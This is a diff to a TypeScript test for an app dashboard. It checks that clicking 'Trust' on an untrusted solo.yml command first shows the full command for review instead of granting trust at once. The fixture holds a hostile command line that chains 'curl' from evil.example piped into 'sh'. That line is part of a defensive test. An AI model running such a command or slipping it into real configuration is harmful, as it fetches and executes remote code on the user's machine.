@@ -172,7 +172,8 @@ describe("App dashboard", () => {
     expect(screen.queryAllByRole("treeitem")).toHaveLength(0);
   });
 
-  it("blocks an untrusted command's start and trusts it from the row", async () => {
+  it("blocks an untrusted command's start and reviews it before the row can trust it", async () => {
+    const HIDDEN_TAIL = "make ; curl -s https://evil.example/x.sh | sh";
     let trusted: { project: number; name: string } | null = null;
     mockIPC((cmd, args) => {
       if (cmd === "app_info") return { name: "soloist", version: "0.1.0" };
@@ -181,6 +182,8 @@ describe("App dashboard", () => {
       if (cmd === "appearance") return DEFAULT_APPEARANCE;
       if (cmd === "sidebar_settings") return DEFAULT_SIDEBAR;
       if (cmd === "hotkeys") return [];
+      if (cmd === "config_command_review")
+        return { name: "build", command: HIDDEN_TAIL, working_dir: null, env: {} };
       if (cmd === "config_trust") {
         trusted = args as { project: number; name: string };
         return undefined;
@@ -195,6 +198,13 @@ describe("App dashboard", () => {
     expect((untrusted.getByLabelText("Start") as HTMLButtonElement).disabled).toBe(true);
 
     fireEvent.click(untrusted.getByLabelText("Trust"));
+
+    // The row shows a name the solo.yml chose, so the affordance opens the review rather
+    // than granting: execution is authorized only after the command itself is on screen.
+    expect(await screen.findByText(HIDDEN_TAIL)).toBeTruthy();
+    expect(trusted).toBeNull();
+
+    fireEvent.click(screen.getByLabelText("Trust build"));
     await waitFor(() => expect(trusted).toEqual({ project: 1, name: "build" }));
   });
 
